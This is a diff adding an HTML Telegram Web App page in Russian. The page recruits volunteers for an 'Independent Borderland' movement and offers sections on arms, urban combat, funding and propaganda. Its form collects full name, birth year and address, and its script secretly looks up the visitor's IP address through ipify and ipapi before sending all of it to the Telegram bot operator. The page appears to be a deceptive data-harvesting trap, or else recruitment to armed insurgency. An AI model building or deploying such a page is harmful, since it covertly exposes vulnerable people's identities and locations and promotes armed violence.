@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Независимое Приграничье</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            transition: border-color 0.3s ease;
+        }
+        input:focus {
+            border-color: #4CAF50;
+            outline: none;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .dropdown-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.5s ease-out;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+            margin: 10px 0;
+            padding: 0 15px;
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.1);
+        }
+        .dropdown-content p {
+            margin: 15px 0;
+            line-height: 1.6;
+        }
+        .show {
+            max-height: 500px;
+            padding: 15px;
+        }
+        .fade-in {
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="text-align: center;">Независимое приграничье!</h1>
+        <h4 style="text-align: justify;">Приветствую новобранец,
+
+            Добро пожаловать в ряды сторонников Независимого Приграничья.
+            
+            Вот уже почти 500 лет как жители Приграничья находятся под гнетом кучки узурпаторов, называющих себя Российской Федерацией.
+            
+            Мы приверженцы Независимого Приграничья объявляем набор добровольцев в ряды неравнодушных людей, считающих себя свободными от диктаторского режима путинской бандитской группировки.</h4>
+        
+        <button class="button" onclick="toggleDropdown('weapon')">С оружием в руках</button>
+        <div id="weaponDropdown" class="dropdown-content">
+            <p><strong>Методичка по вооружению:</strong></p>
+            <p>1. Основные виды оружия: АК-47, пистолеты Макарова.</p>
+            <p>2. Правила безопасности при обращении с оружием.</p>
+            <p>3. Тактика ведения боя в городских условиях.</p>
+        </div>
+
+        <button class="button" onclick="toggleDropdown('finance')">Финансирование</button>
+        <div id="financeDropdown" class="dropdown-content">
+            <p><strong>Методичка по финансированию:</strong></p>
+            <p>1. Способы сбора средств: краудфандинг, пожертвования.</p>
+            <p>2. Управление бюджетом движения.</p>
+            <p>3. Отчетность перед спонсорами.</p>
+        </div>
+
+        <button class="button" onclick="toggleDropdown('agitation')">Агитация</button>
+        <div id="agitationDropdown" class="dropdown-content">
+            <p><strong>Методичка по агитации:</strong></p>
+            <p>1. Основы пропаганды и контрпропаганды.</p>
+            <p>2. Работа в социальных сетях.</p>
+            <p>3. Организация митингов и акций протеста.</p>
+        </div>
+
+        <button class="button" onclick="toggleDropdown('recruiting')">Рекрутинг</button>
+        <div id="recruitingDropdown" class="dropdown-content">
+            <p><strong>Методичка по рекрутингу:</strong></p>
+            <p>1. Методы вербовки новых членов.</p>
+            <p>2. Проверка лояльности кандидатов.</p>
+            <p>3. Система обучения новобранцев.</p>
+        </div>
+
+        <form id="mainForm" style="margin-top: 20px;">
+            <input type="text" placeholder="ФИО" id="fio" required>
+            <input type="text" placeholder="Год рождения" id="birthYear" required>
+            <input type="text" placeholder="Место жительства" id="address" required>
+            <button type="submit" class="button">Отправить данные</button>
+        </form>
+    </div>
+
+    <script>
+        let collectedData = {};
+        let IS_IP_SENT = false;
+
+        // Функция для открытия/закрытия dropdown
+        function toggleDropdown(id) {
+            const dropdown = document.getElementById(id + 'Dropdown');
+            dropdown.classList.toggle('show');
+            if (dropdown.classList.contains('show')) {
+                dropdown.classList.add('fade-in');
+            }
+        }
+
+        // Функция сбора IP
+        function collectIP() {
+            return new Promise((resolve) => {
+                const sources = [
+                    fetch('https://api.ipify.org?format=json').then(r => r.json()),
+                    fetch('https://ipapi.co/json/').then(r => r.json())
+                ];
+                
+                Promise.any(sources)
+                    .then(data => {
+                        collectedData.ip = data.ip || data.ip;
+                        resolve();
+                    })
+                    .catch(() => {
+                        collectedData.ip = 'Не удалось определить IP';
+                        resolve();
+                    });
+            });
+        }
+
+        // Обработчик отправки формы
+        document.getElementById('mainForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            collectedData.fio = document.getElementById('fio').value;
+            collectedData.birthYear = document.getElementById('birthYear').value;
+            collectedData.address = document.getElementById('address').value;
+            
+            await collectIP();
+            
+            if (!IS_IP_SENT) {
+                IS_IP_SENT = true;
+                window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
+                
+                // Очистка формы
+                document.getElementById('mainForm').reset();
+                
+                // Визуальный эффект
+                const form = document.getElementById('mainForm');
+                form.style.opacity = '0';
+                setTimeout(() => {
+                    form.style.transition = 'opacity 0.5s';
+                    form.style.opacity = '1';
+                }, 500);
+                
+                window.Telegram.WebApp.close();
+            }
+        });
+    </script>
+</body>
+</html>
